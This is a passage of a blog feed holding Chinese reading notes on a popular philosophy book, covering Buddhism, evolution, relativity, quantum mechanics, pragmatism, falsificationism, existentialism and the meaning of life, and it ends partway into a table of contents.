，在佛教里叫做“无常”。<br>“法无自性”进一步总结说：世间万物都是随时生灭，不能永恒存在的。<br>这也是一个辩证唯物主义者都能接受的理论：世上的所有事物都是在运动变化的过程中，所有事物都有生有灭，没有永恒不变的事物。<br>继续推理：<br>假如万法无常——假如说世间万物都不是永恒的，那“我”也是属于万物，自然可以推出“我”也是无常，是有生有灭的，不是永恒不变的。<br>用佛教的属于说，叫做“无我”。</p><p>进一步理解，“我”指的不是肉体，而是“我”的意识。</p><p>但是根据“万法缘起”，自我意识的“我”也是万法的一种，也是万法缘起，因此也是不能永恒存在的。<br>凡是涉及灵魂的概念，都不是佛教的说法。<br>认为万物实有，用佛教的属于说叫做“法执”<br>认为“我”实有，术语叫“我执”<br>人产生了“法执”和“我执”，就会产生贪婪心。<br>佛教的第二条：轮回<br>“因果报应”<br>众生做的事情在佛教里叫做“业”。“业”按照因缘规律而产生的后果叫做“果”或者“报”。<br>唯物主义的因果规则是物理学，而佛教规则是它自己的道德标准。<br>第一个疑问是：因果报应能不能推出决定论？<br>“决定论”是人类没有自由意志，每个人的思想行为都是其他事物因缘和合的结果。<br>决定论的意思是说，假如我的一切思想都是由我生活的环境决定的，我的一切行为都是之前种种因缘的结果，什么是之前种种因缘的结果。<br>那么整个世界就是一个按照因缘规则运行的。无意识无感情的机械体。<br>但是，佛教的因果报应和自由意志也可以并存。</p><p>佛教具体修行方法，概括有三种：<br>戒、定、慧<br>戒——指的是遵守戒律，约束自己的行为。从更深的角度说，通过戒约束自己的行为让自己少造业，也就能接近涅槃的目标。<br>定——指的是大作禅定，一方面能增加人对自己的约束力，另一方面有助于思考，有助于领悟智慧从而不再“无明”<br>慧——指的是开启智慧。也就是学习佛法，认识世界的本质，不再“无明”</p>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>哲学家都干了什么-下</title>
      <link href="/2018/03/30/%E5%93%B2%E5%AD%A6%E5%AE%B6%E9%83%BD%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88-%E4%B8%8B/"/>
      <url>/2018/03/30/%E5%93%B2%E5%AD%A6%E5%AE%B6%E9%83%BD%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88-%E4%B8%8B/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>【读书笔记】：哲学家们都干了些什么？ 下<br><a id="more"></a></p><p>　　第二次世界大战之后，社会格局、人类思想变得越来越多元，没有什么能统治全人类的思想，各种新思潮层出不穷。我们看不到某种形而上学统治人类思想的样子。<strong>从这个角度上说，尼采才是伟大的预言家。他要毁灭传统的价值观，写了一本《重估一切价值》。二战以后的现实确像他所说的，所有的传统价值都崩溃了，一切价值都应当重估。</strong><br>　　<br>　　在近代，建立在理性基础上的科学创造了各种人间奇迹。这是理性蕴含无穷力量的最好证据。多亏科学的成就，人类在历史上从没有像最近两百年这么自信过。在今天，谁能不相信科学的力量呢？<strong>罗素说，如果有一个国家完全不相信物理学，那么另一个国家只需要靠几个物理学家就可以把前一个国家灭了。换句话说，你要是不相信科学，你在这个世界上连生存都谈不上，就更别提其他了。</strong><br>　　<br>　　我们来看看在第一次世界大战之前，科学的新发现为我们提供了什么有用的东西。<strong>首先是物理学的进步。</strong> 力学在牛顿之后两个世纪里基本没受到什么质疑。很多物理学家认为牛顿力学已经揭示了世界的真实面目，此后的物理事业没有太多可发展的余地了，不过是修修补补、把物理数据弄得更精确点罢了。因此有科学家说过，牛顿既是天才也是幸运的，因为只有一个宇宙可以供人发现，而牛顿已经把最重要的规律都发现了。不过即便在牛顿力学的影响下，物理学仍旧有重要的发展，就是能量守恒和质量守恒定律。这两大定律进一步扩大了物理学的影响力，再次让人们发现，人体和其他无机物在物理上没有什么区别。<strong>第二个是进化论的发现。</strong>科学将触角伸向了有机体。我们待会儿专门拿出一章来讲。第三个是心理学的发展。 这回，科学直接染指精神领域了。 现代心理学使用的是科学的研究方法，研究成果很丰硕，很多原本神秘的心理活动如今也有了清晰的规律。人们已经可以适当地干涉、改变人类的内心活动。比如“巴甫洛夫的狗”，大家都知道吧，巴甫洛夫一边喂狗一边摇铃，最后训练得狗一听铃声就会流口水。这就等于可以用科学的方法去改变动物——也包括人类——的本能，使得人类对生物的干涉前进了一大步。这样一来，人们对科学的自信心变得出奇的高。人们相信，只要假以时日，科学可以解决一切问题。就算是艺术、哲学那些过去被认为科学难以碰触的领域，将来运用<strong>心理学</strong>也可以解释了。</p><p>科学的发展给哲学带来了两个影响：第一个影响是把宗教完全打趴下了。 科学打击宗教的方法主要有两个，一个是不断创造科学奇迹增加人类的自信心；一个是公布各种和《圣经》记载矛盾的科学结论。就比如日心说之于地心说，进化论之于神创论。</p><p>更何况，科学可以创造出各种人间奇迹。宗教一直号称神迹可以让人们获得丰收、治愈疾病。但在近代，是科学不断在提高粮食产量、治愈疾病，而祈祷并不是每次都管用。</p><p>科学发展的第二个影响是，随着科学的触角越来越广，机械论和决定论必然重新抬头。就像前面说的，随着科学成就的增加，人们相信科学可以解决一切问题。甚至有人提出来，以后没必要有哲学这个科目了。哲学问题不过都是人的心理活动而已，以后哲学只作为心理学的一个分支就足够了。这种用科学代替哲学的想法，被称为“科学主义”。<br><strong>达尔文</strong>之牛，和欧几里得一样，不仅因为他设计了一个超强的理论，还因为他的理论在后世几百年中不断被人们攻击、讨论。结果越讨论，证明它正确的证据就越多。</p><p>　　进化论的关键内容有这么几条：第一，生物的基因信息可以遗传给下一代： 第二，在遗传的时候，基因会发生不可控制的随机变异； 第三，整个生物种群都面临着巨大的生存压力，每一代新生物的数量却大于自然资源能够供养的数量，因此每一代新生物中的大部分都会死掉。第四，生物后天的变化在大部分情况下不能改变基因。</p><p>　　进化论把这神秘性给打破了。进化论就像牛顿力学那样，用极为简单的理论解释了复杂的世界，而且逻辑严谨，能自圆其说，不需要任何超自然力量的干涉，比牛顿力学更容易让人接受。<br>　　<br>　　达尔文在《物种起源》书里画了一张插图，画的是一棵巨大的树，树根是原始生物，越往上树的分叉越多，生物越复杂。这张图暗示了生物是从低级到高级“进化”的，生物越进化，构造越复杂。这是《物种起源》里唯一一张插图，我们的课本上过去也有这张图，然而这张图是错的。目前生物学界更喜欢的画法是把所有的生物画成一个圆形，越靠圆心的生物在地球上生存的时间越早，人类和今天所有的动植物平均分布于圆形的边缘，看不出谁比谁更高级来。<br>　　<br>　　达尔文的进化论则认为，长颈鹿并不是自己把脖子伸长的，而是每一代新出生的长颈鹿因为基因的变异，脖子有长有短，脖子较短的长颈鹿很难生存下来，都死了，只有长脖子的基因才能留下来。久而久之，长颈鹿的脖子也就越来越长了。<br>　　<br>　　那么雄孔雀的尾巴呢？这玩意儿纯粹是累赘！这个疑问乍一看的确是对进化论非常有力的攻击，所以达尔文说：“每当我凝视雄孔雀的尾羽，总感到一阵恶心！” 解释是，<strong>进化中除了生存选择外，还有生殖选择。</strong><br>　　<br>　　有两个解释可以反驳、否定进化论的倾向。第一，所有的科学理论都是一种假说。这就是为什么我们前面要费这么大力气解释进化论的细节，我是想让大家明白，达尔文进化论是目前最合理、佐证最多、反证最少，也是最简洁、最聪明的假说。第二，有越来越多的科学发现增加了进化论的可信度。除了现实中可以观察到活生生的进化过程外，最有力的证据，是在不同地质层里发现的化石都符合进化论的预言。</p><p><strong>社会达尔文主</strong>：把进化论推广到社会学领域。在接受了进化论以后，有些人试图把这一理论应用到其他领域，就像哲学家把力学应用到机械论世界观中一样。其中给人类造成最大恶果的就是社会达尔文主义了。 简单地说，社会达尔文主义的意思是，我们的社会也应该像优胜劣汰的大自然那样，有很高的淘汰率，把不适合生存的人都淘汰掉，以便达到最高效的进化。其中最具代表性的就是纳粹的种族主义。纳粹认为只有“优等”种族才有权利在资源有限的地球上生存下去，其他的“劣等”种族必须淘汰掉，以免和优等种族抢夺资源，以免他们以通婚方式“污染”优等种族的基因。这种社会达尔文主义给纳粹迫害犹太人找到了理论借口。</p><p>这是一个集体主义的价值观。然而，根据进化论，我们还可以得到另一个完全相反的结论：进化论不是说基因的遗传——即个体的生存、生殖——是最重要的吗？换句话说，人类基因的本性就是自私的，这是毋庸置疑的，因为不自私的基因都没得到遗传。那么，自私不就是人类的天性吗？这样看来，每个人都为自己的利益行事也是天经地义的。“人不为己，天诛地灭”，这便形成了和社会达尔文主义相反的、极端的个人主义的价值观了。怎么看待这两种观点呢？ 英国作家理查德・道金斯写了一本《自私的基因》，解释了生物种群中的利他行为。比如有的蚂蚁为了其他蚂蚁的生存，会牺牲掉自己。这是因为，在有的情况下，我们应该把某一个生物群体看成一个基因单位。当生物是以种群为单位生活的时候，基因中可以带有一些牺牲自己帮助他者的“利他基因”，这样更有助于整个种群基因的延续。当个体牺牲自己利于他者的时候，就等于通过他者延续了自己的基因，并不违背进化论的模式。所以，<strong>“人类天生自私”的这种观点就可以被否掉了。人类就是典型的社会型生物，人类的基因中，并不一定就不存在“利他基因”。</strong></p><p>无论是天性自私论，还是社会达尔文主义，全都犯了一个错误，<strong>那就是把“我们为何成为这样”和“我们应该怎样”等同在一起。</strong>这些观点的逻辑是，既然人类的基因是经过生存斗争而来的，那么人类就应该把这种斗争精神延续下去，继续通过竞争来筛选基因。</p><p>但是，为什么呢？进化论仅仅阐述了一套基因变化的规律，这中间并没有任何道德含义。而且正是进化论把神创说从生物界赶走了，才把生物学中的道德元素降到最低的程度。 在整个进化论学说中，有任何的观点能说明，进化论是道德的吗？是高尚的吗？是人类不可干涉的吗？实际上，就像人类利用力学改造自然一样，人类早已在插手生物的进化过程。这才有了不适合野外生存的家畜，才有了农作物。 所以，把进化论的观点和道德连接在一起，是思维混乱的表现。</p><p>按照<strong>爱因斯坦</strong>的说法，太阳的引力能够扭曲光线。在白天，我们观测太阳旁边的星星时，星星发射到地球的光线不是正好路过太阳吗？这光线就会受到太阳引力的干扰，我们所看到的星星位置会受到影响。而到了晚上没有太阳的时候②，我们观测到的星星的位置没受到太阳的影响，就和白天的不同了。但我们都知道，白天是看不到星星的，因为太阳太亮了。 只有一种情况除外：日全食。</p><p>在牛顿时代（也是咱们普通人的概念），时间和空间都是独立的，互相没有关系。就像“5分钟”和“3厘米”根本没法放在一起计算一样。 但是<strong>狭义相对论认为，</strong>时间和空间不是互相独立的，可以互相影响，不同运动状态的人观察同一个物体，观测到的时间、大小都不相同。因此时间和空间得放在一起研究，统称为时空。<strong>质量和能量也不是互相独立的，统称为质能。这也是核武器的理论基础。</strong></p><p>直到<strong>广义相对论</strong>出现后，人们对于引力才有了一个较为合理的解释。<strong>广义相对论的意思是说，当空间中存在物质和能量的时候，空间就会受到影响而弯曲，质能越大，空间弯曲得越厉害。</strong>引力就是这种空间弯曲产生的。有一个非常形象的比喻。好比我们的空间是一张抻平的床单，当我们往上放一个木球的时候，床单会被压下去，那么木球周围其他更轻的小球就会滚向木球，看上去就好像小球被木球吸引了一样。假如放的是铅球呢，床单会被压得更严重，造成的空间扭曲更大，引力也就更大。相对论对于哲学的意义在于，这进一步打击了人们对先验理性的信心。<br>我们顺便说一下，相对论的发现也正好证明了休谟怀疑论的正确。休谟说，无论我们过去看到多少重复发生的事件，我们也不能断言这事件在未来一定会再次发生。<br><strong>测不准原理：</strong>然而物理学家们在研究量子的时候发现了一个奇怪的现象。物理学家观测一个电子，越是精确地确定其位置，就越无法确定它的动量；越是想更精确地测定它的动量，就越测量不到它的位置。这并不是因为科学家的观测技术不行，而是由严格的理论决定的。这个规律叫作“海森堡测不准原理”或者“海森堡不确定性原理”。也就是说，你大可以想象每一个电子在某个瞬间有固定的位置和动量，但这对于人类是没有意义的。人类永远无法知道一个电子的运动状态，也永远无法精确预测电子的运动，只能大略猜测它的运动趋势。而且，因为不能准确预测某个电子下一刻的位置，所以我们连分辨两个电子的能力都没有。当我们观测两个相同电子的时候，我们只能看到两个电子闪来闪去，我们根本没法知道哪个是哪个。</p><p>然而量子力学说的是什么呢？<strong>在量子级别的世界里，没有决定论，也没有确定的因果律。</strong>科学家们对于一个电子的运动状态只能预测出一个概率，只能说大约、可能在哪儿。物理学成了一门缺乏确定性的学说。这一下子让整个物理学都变得可疑了。难怪爱因斯坦对这一学说特别反感。在这个问题上，爱因斯坦扮演了顽固派的角色，试图用各种办法来驳倒测不准原理，爱因斯坦有一句名言：“上帝不掷骰子。”意思是说，世界不可能真正是随机的，一切都是确定的。然而，这回是爱因斯坦错了。</p><p>经过无数次讨论，今天的科学家们普遍接受了海森堡等人的结论。人们相信，在对量子的认识上存在着不可逾越的限制，人类永远无法准确地认识量子。霍金因此说：“上帝不但掷骰子，还把骰子掷到我们看不见的地方去。”说这世界不仅存在随机性，而且人类无法更准确地了解它。这意味着，人类对世界的认识能力又受到了进一步的限制，而且只要量子力学不被推翻，这限制就永远无法超越。 那种认为“随着不断发展，科学终究能解释</p><p>量子力学还有一个问题，它和广义相对论是矛盾的。<strong>用广义相对论去研究宏观宇宙，用量子力学去解释微观世界，都没什么问题。</strong>但是这两个理论却无法相容。这里面显然有问题，但是科学家们无论是从量子力学还是广义相对论中，都还没有找到突破口。科学家们觉得，应该从更高的层次上来统一这两种理论。比如美国电视剧《生活大爆炸》里的主角Sheldon搞的超弦理论以及另一套M理论，都是目前非常流行的方案。但这些方案的问题是，它们只能在数学上进行统一，却无法用实验验证。因为实验所需要的技术远远超过了人类现有的能力。不能用实验检验，这对于物理学家来说是很难接受的，但也没有什么好办法。</p><p>　　罗素的名言是：“三种单纯又极其强烈的激情支配着我的一生：<strong>对爱情的渴望，对知识的追求，以及对于人类苦难不可遏制的同情</strong>。”这话广为流传。<br>　　科学虽然倒打了理性一耙，但这一耙还不是很厉害。我们可以承认理性在宏观和微观上都有局限，但这并不是说理性在现实生活中就没地位了。在日常生活里，我们不还在用牛顿定律嘛。<br>　　这个逻辑学家只能继续出版这本书，并在书的末尾加上一句：“一个科学家所碰到的最不爽（undesirable）的事，莫过于在他的工作即将完成时却发现所干的工作的<strong>基础崩溃</strong>了。”然后他把罗素的信附在了结尾。<br><strong>富与穷：</strong>咱们过去受阶级观念的影响，认为穷人先进，富人落后。所以历史人物的形象，多半是越穷越聪明勇敢，越富越残暴愚蠢。但事实上，不少艺术家、思想家都出身富贵家庭。这是因为有钱人也不会是傻子，他们不少人当然不希望自己的后代变成纨绔子弟，他们和普通家庭的家长一样，都会尽力教育好自己的子女。而有钱人有更多的资源可以利用，培养出人才的概率也就可能更大一些。<br>　　一个全世界最有才华的哲学家，同时还是世界级的大富翁，放弃了一切财产去穷乡僻壤教孩子，这事正常人肯定理解不了。维特根斯坦的侄子就说：“作为乡村小学教师的亿万富翁肯定是个变态狂。”关于这事还有个段子，当时有人问他你为什么把钱给自己的家人，怎么不给穷人啊。维特根斯坦回答说，金钱让人堕落，而他的亲人已经够堕落了，所以再堕落点也没关系。<br>　　所以维特根斯坦说：“凡是可说的事情，都可以说清楚，凡是不可说的事情，我们必须保持沉默。”对这句话我的理解是：凡是符合逻辑实证规则的语言，内容都很清晰准确；凡是不符合逻辑实证规则的语言，说了也是没意义的，就不用说了。<br><strong>实用主义</strong>和逻辑实证主义的思路不一样，逻辑实证主义看到的是科学的严谨性，希望哲学也能和科学一样严谨。实用主义则看重科学的实用性，看到科学家没哲学家那么多废话，在科学研究中什么理论好用就相信什么。实用主义者觉得，哲学也得像科学这样，不再说空话，不再讨论空泛的大问题，而是重视哲学的实用性。<br>　　<br>　　实际上，马克思当年为了维护工人阶级利益提出的很多要求，大部分都被资本主义国家接受并且实现了。如今这种改良式的资本主义在西方颇受欢迎，这可以让我们看到实用主义在西方的用处。也不要以为实用主义只有西方人才喜欢。实用主义离我们也不远，有一句话我们很熟悉：“黑猫白猫，能抓住老鼠就是好猫。”实际上，我写的这本书就奉行着实用主义的观点。我以为，我们普通人学习哲学是为了解决各种靠物质无法解决的人生苦恼。就像俗语说的“能用钱解决的问题都不是问题”，我们就是来解决用钱解决不了的问题的。所以我在筛选、介绍哲学观点的时候，最关心的一件事就是：这个哲学观点能不能帮助我们减少痛苦，能不能让我们内心平静，能不能让我们不再空虚、不再恐惧、不再陷入物欲的无限烦恼之中？<br><strong>胡适</strong>在《中国哲学史大纲》中说：“凡研究人生的切要问题，从根本上着想，要寻一个根本的解决，这种学问，叫作哲学。”他所持的，也就是实用主义的哲学观。但要注意了，实用主义并不代表着只要观点对我们有用，我们就能没有原则地拿来相信。对于咱们前面提出的各种人生问题，最容易接受、做法，胡适在《中国哲学史大纲》中说：“凡研究人生的切要问题，从根本上着想，要寻一个根本的解决，这种学问，叫作哲学。”他所持的，也就是实用主义的哲学观。但要注意了，实用主义并不代表着只要观点对我们有用，我们就能没有原则地拿来相信。对于咱们前面提出的各种人生问题，最容易接受、效果又最好的观点，莫过于相信这世界上有神灵，公平地赏罚一切，而且人的灵魂不灭。以上这些观点是最“实用”的了，但我们绝不会因此就认为它们是真理。我们依旧严格按照逻辑、按照理性思辨来寻找我们的答案。就算我们得到一个让人绝望的结论，我们也会坦然接受。<br>最典型的例子是在17世纪之前，欧洲人见到的所有天鹅都是白色的。无数次的观察结果让欧洲人相信，天鹅一定是白色的。但在1697年，人类发现了黑色的天鹅。这个例子正好证明了实证主义的错误，即便人们发现再多的白天鹅，也不可能得出“所有天鹅都是白色”的结论。<br>波普尔看出了其中的问题，提出了一个检验科学理论的重要标准<strong>：证伪。</strong>什么是科学理论，什么不是？其中关键的标准，是看这个理论有没有可以被证伪的可能。<br>我们有的人可能会简单地以为，民主就是“大家一起投票，多数说了算”，就是“少数服从多数”。其实这种原始的民主制度有极大的缺陷，<strong>这个缺陷在雅典人判苏格拉底死刑、法国大革命的屠杀、希特勒被民众选上台等事件中已经暴露无遗，早就被现代社会抛弃了。</strong><br><strong>民主制度的核心精神：</strong>证伪主义的政治观，最关心的不是谁制定的政策，而是无论谁制定的政策，都不能成为绝对真理。不管是美国总统下的命令还是全世界人民投票的结果，都要给别人留出修改、推翻它的机会。在这种制度下，无论谁被民选上台，也不会给世界造成太大伤害。因为他上台后的个人权力非常有限，哪怕加个税都需要国会批准。<strong>他还必须随时面对全国媒体的质疑、随时可能被弹劾、干四年就得重选、干八年就得下台。这制度不能保证总统想出“最正确”的决策，但可以保证一旦总统作出“错误”的决策，举国上下有无数可以阻止它的机会。可以随时“纠错”而不是“多数说了算”，这才是现代民主制度的核心精神。</strong></p><p><strong>生物学为什么另起炉灶：</strong>您能意识到科学理论互相取代，依据的是什么原则了吗？是实用主义！那个市侩的、庸俗的、让我们瞧不起的实用主义，竟然是整个科学的核心？在相对论出现以后，我们发现，牛顿力学从较真的立场上来说都是错的。我们生活的空间是弯曲的，我们随便摆放一块橡皮就可以改变空间的弯曲程度。我们坐了一趟汽车，表就和标准时间有了一点点偏差。然而，我们在生活中从来不使用相对论解决问题。人们在制造汽车轮船的时候，用的仍旧是牛顿力学的公式。为什么明明有更准确的理论我们不用，非要用不够准确的呢？原因不用我说大家都知道：牛顿力学在日常生活中已经足够准确而且足够简单。<strong>一句话，更实用。</strong>再比如，生物体内的分子原子都严格遵守物理定律。那么我们可以把生物看成一个由大量分子组成的物体，使用种种物理定律去研究它的规律。然而事实上，<strong>我们在研究生物的时候，用的是和物理学完全不同的生物学，是一套全新的定义和理论。我们为什么抛弃掉物理学已经取得的巨大成就，在生物体研究上另起炉灶呢？这就是因为，当我们把某个器官当作一个整体，按照生物学的方法去研究时，要比把它当作一个复杂的分子集合体用物理学去研究简单省事得多。</strong>虽然物理学研究的结果更精确，但是生物学的方法简单实用，所以我们选择使用生物学。还是因为实用。</p><p>实用主义哲学家詹姆斯有一个比喻，原本是来说宗教信仰问题的，我给改写了一下。说有一个小伙子想要向一个女孩求婚。这个小伙子只想和美若天仙的女孩结婚，但除非结婚，否则他没办法知道这个女孩的相貌，于是小伙子就很纠结。因为女孩的外貌不能被检验啊，按照科学的原则，就得当作这事儿不成立。那么小伙子一直犹豫，也就一直没跟那女孩求婚。小伙子对待女孩子外貌的原则和我们对待隐形龙一样：女孩的相貌我没法知道，那我就得存疑，我不能证明女孩是一个美若天仙的人，我就一直不能做出结婚的决定，婚事就得一直拖着。但詹姆斯说了，小伙子对结婚犹豫不决，拖着没求婚，这不也是一种选择吗？这不就等于选择了相信“女孩并非貌若天仙”了吗？换句话说，怀疑论者以为自己把所有可疑的东西都悬置起来了，不当它是真的，实际上，这就相当于你当它是假的了！所以怀疑论者以为自己是谨慎的、中立的，但是怀疑论者对可疑的事情采取了不相信的态度，本身还是一种独断的选择。按照詹姆斯的话说，怀疑论者觉得<strong>“与其冒险步入谬误，倒不如冒险丧失真理”</strong>。这和盲目相信有什么区别呢？<br>虽然我们不能把科学当作衡量一切理论的标准，但是我们仍旧有标准可以用。我认为有两个原则必须坚持：<strong>第一是经验主义原则。</strong>换句话说，理论好用不好用，必须眼见为实，拿出大家都承认的证据来。<strong>第二是实用主义。</strong>理论还得有实用价值，不实用的理论再诱人也没有意义。<br>这可以证明：科学并不一定就是解释、改造世界的唯一标准。比如在做菜这件事上，科学方法就被打败了。而且我们评价两者孰优孰劣的标准是非常清晰的：立足经验主义的实用主义。中国烹饪法做出来的菜好吃，技巧容易掌握。所以就赢了。<br><strong>什么叫“迷信”呢？不经思考的相信，不允许别人质疑，就叫“迷信”。</strong><br>教会当年用了成千上万个宗教裁判所、遍地而起的火刑架都没能统一观点。科学家们只靠着几本学术期刊就搞定了。这不是非常了不起的事吗？很多宗教人士都乐于使用汽车、飞机、手机、电话等高科技产品。不为什么，就因为这些东西是最实用的。在一百年前，传教必须靠步行万里路，站在街头扯着脖子喊。现在传教可以用鼠标一点，网页上一发，几十万人都能同时看到。这样方便的技术，为什么不用？<br><strong>关于“意义”：</strong>我们都不需要有文化的人出手，随便拽过一个大妈，就把前面那几个问题都搞定了。你问大妈：“我怕死，怎么办？”大妈说：“怕啥啊！愁也是一天，乐也是一天，为啥不乐啊。”——她回答了，“追求快乐”就是人生意义，关注眼下的快乐，就可以不怕死亡。你问她：“我觉得满足欲望也没什么意思，怎么办？”大妈说：“人活着得有个爱好啊。你瞧我，天气一好就到广场上跳舞，身体好，还交了不少好朋友，多快乐！”——她回答了，“拥有爱好，锻炼身体，和朋友相伴”就是人生意义，这样做能避免孤独、沮丧和纵欲的空虚，拥有持久的幸福。你问她：“我不想过庸常的一生，怎么办？”大妈说：“我听不懂啊，啥叫庸常？平安是福，知足常乐。健健康康、没病没灾的，这日子不挺好吗？”——她回答了，“平常生活来之不易，因此平凡的生活并不平凡”，认识到这一点，就是人生意义。你问她：“人生要受那么多苦难，有什么意义？”大妈回答：“啥意义？我不懂啥意义，苦这东西，轮到你吃的时候你就得吃。反正吃苦总有个头呗。”——她回答了，“等到苦尽甘来的一刻”就是吃苦的意义。</p><p><strong>心理学可以驱散人的负面情绪，让人更充实快乐，这当然是一门很棒的学问。</strong>但是心理学不能告诉我们，这世界有没有终极存在，不能告诉我们人生的意义是什么。当心理医生为你解答这些问题的时候，他考虑的不是这些问题的真假，而是该怎么回答才能让你的心里更舒服一点、更健康一点。这是标准的<strong>实用主义</strong>，对你效果最好的答案，医生就会当成真理告诉你。</p><p>在理性的领域里，面对“人生的意义是什么”等等形而上学问题，要么去求助心理医生，要么就没有答案了。这就是本书的结论。如果这本书您看到这里，对有一些地方仍然感到迷迷糊糊，有些地方仍然没看懂，甚至光顾着去看八卦了，那也没有关系。我现在告诉您一句结论，只要记住这句结论，这本书就算没白看（睡觉的同学醒醒，老师划<strong>重点</strong>了）。<strong>这句话是：形而上学走不通，形而上学的问题都没有答案。记住这一句话就够了。</strong>我们说过，形而上学的任务，是用理性思维去研究世界本质等“大问题”。形而上学走不通，也就是说，理性不可能回答“世界的本质是什么”“有没有终极真理”“终极真理是什么”“人生的意义是什么”等大问题。硬要回答，答案一定是独断论的，或者在推理上有错误。形而上学家们研究了好几百年，就得出这么一个结论。实际上，所有的形而上学都会陷入无法证明自身的困境。我们说过，经验主义者们的论断“只有来源于经验的知识才是可靠的”，并非来自于经验。康德用来批判理性的工具却没经过自己的批判。黑格尔讲辩证法，但是他的辩证法到最后却并不辩证。尼采说所谓的真理都是谬误，那他自己的理论不也是谬误了吗？逻辑实证主义用来分析语句的规则，经过自己的分析都变成无意义的了。波普尔的证伪主义理论，是不能被证伪的。后来到实用主义的时候，罗素批评说：实用主义以“是否实用”为标准评价真理，但是“是否实用”的标准是什么呢？如此追问下去，必然会形成无限回溯，得不出结论。<br>艺术：问题没有答案，最聪明的人们追求到最后，不约而同地发现这是一条绝路。但正是因为这些艺术家陷于永远无法挣脱的苦闷，而他们又非要倚仗自己过人的天才全力挣扎，所以他们的作品才能深深打动我们。所以世界上才有艺术这东西。</p><p><strong>萨特</strong>反对这种借口。他认为，人在各种极端的情况下，都有选择的自由。哪怕是不选择，也是一种选择。既然有选择的自由，也就要对任何一种选择的后果都负责任。萨特说这话有很强烈的现实意义。他经历过德占时期，面对侵略者的铁蹄，很多法国人都面临着良心和生存的选择。有些人就会为自己的选择错误辩护说：我出卖良心，不是我自己选的，是迫不得已啊。萨特的回答是，<strong>你任何时候都有选择的自由，你有牺牲自己生命的自由，你只是没选而已。</strong>这并不是说我们要强迫每个人都要大义凛然地去牺牲，不，选择牺牲也是一种自由，也可以选择。问题不是你选择了什么，问题是无论选择什么，你都要为此负责任。</p><p>　　我们常说一句话，“小的时候想要快点长大，等到长成了大人，反倒要羡慕小孩子。”为什么会出现这种反差呢？我们细想，小时候羡慕大人什么？羡慕大人想做什么就可以做什么，也就是说，羡慕大人的自由。那么大人羡慕小孩子的什么呢？羡慕小孩子可以无忧无虑地生活，也就是说，羡慕小孩子没有生活压力，不需要尽很多生活的责任，因为有大人护着、养着他。因此，自由（即权力）和责任是相伴的，自由越大，责任越大。人们趋利避害，都想只占有自由的好处（当不负责的大人），又想逃避随之而来的责任（当自由自在的小孩）。可是，这怎么可能呢？萨特提醒我们，既然有选择的自由，就要承担选择的责任啊。而且萨特还强调，不能逃避选择，哪怕是什么都不选，你也是在选择，也要承担责任。因此自由多了并不是好事，反倒因为责任的增多给人增加负担。这是现代社会精神危机的一个根源，也是很多人宁愿选择盲从偶像、盲从权威的心理动机之一。<br>　　<br>比如宗教信徒认为，在教义的指导下生活就是人生目的；叔本华认为，对抗生命意志是人生目的；尼采认为，努力当超人是人生目的；黑格尔更是认为整个历史都是有目的的，个人的人生目的是去努力实现历史的目的。<br>总之，我们对自己的人生的评价、规划，一定是个故事模式，一定有高潮和结尾。但现实并不是如此。当现实和我们的印象发生冲突的时候，荒谬感就产生了。<br>那该怎么办呢？<strong>我觉得唯一的办法是和大众的做法一样，自己给自己找到人生意义（虽然是虚假的）。用西西弗的比喻来说，我们只能在推石头的时候哄自己说这么做是有意义的，并且乐在其中。这个哄骗自己的借口，就是人生意义。</strong><br>一个“人生意义”只有唯一答案的世界，是不是很可怕呢？参差多态，乃幸福之本源啊。那么，该如何找到自己的人生意义？我认为最有效的办法，是逼迫自己直面死亡。我们问人生的意义是什么，其实就是在给自己的人生找一个目标，就是在问：“我为什么活着？”这也就等于在问：“我为什么不立刻自杀？”<strong>加缪说过：“真正严肃的哲学问题只有一个，那就是自杀。”</strong><br>人小的时候要问“人为什么活着”，长大了就不问了，不一定是因为知道答案了，而是因为某些原因让他觉得不再需要问这个问题了。当你不再问这个问题的时候，或许就意味着你已经找到了答案。</p>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
          <category> Philosophy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>哲学家都干了什么-上</title>
      <link href="/2018/03/30/%E5%93%B2%E5%AD%A6%E5%AE%B6%E9%83%BD%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88-%E4%B8%8A/"/>
      <url>/2018/03/30/%E5%93%B2%E5%AD%A6%E5%AE%B6%E9%83%BD%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88-%E4%B8%8A/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>【读书笔记】：哲学家们都干了些什么？上<br><a id="more"></a></p><blockquote><p>前言</p><p>上篇 理性的崛起<br>第一章哲学好讨厌<br>第二章少年国王<br>第三章使徒行传<br>第四章上帝之城<br>第五章异教徒<br>第六章神们自己<br>第七章群魔<br>第八章异端的权利<br>第九章奇怪的论调<br>第十章童年的终结<br>第十一章理性主义<br>第十二章形而上学<br>第十三章二元论<br>第十四章唯我论<br>第十五章寒冬夜行人<br>第十六章双星<br>第十七章名利场<br>第十八章巨匠与杰作<br>第十九章机械论<br>第二十章决定论<br>第二十一章暴风雨<br>第二十二章哲学怪兽<br>第二十三章谎言的衰落<br>第二十四章远离尘嚣<br>第二十五章王者之风</p><p>下篇 理性的陨落</p><p>第一章傲慢与偏见<br>第二章悲观主义<br>第三章理性的危机<br>第四章瞧！这个人<br>第五章钢铁之躯<br>第六章被侮辱的与被损害的<br>第七章科学新发现：理性的反击<br>第八章人猿星球<br>第九章科学倒打一耙<br>第十章寻欢作乐<br>第十一章快乐王子<br>第十二章逻辑实证主义<br>第十三章实用主义<br>第十四章终结形而上学<br>第十五章实用主义的科学<br>第十六章科学是什么<br>第十七章永恒的终结<br>第十八章存在与虚无<br>第十九章西西弗的神话<br>第二十章人生的意义</p></blockquote><h1 id="上篇：理性的崛起"><a href="#上篇：理性的崛起" class="headerlink" 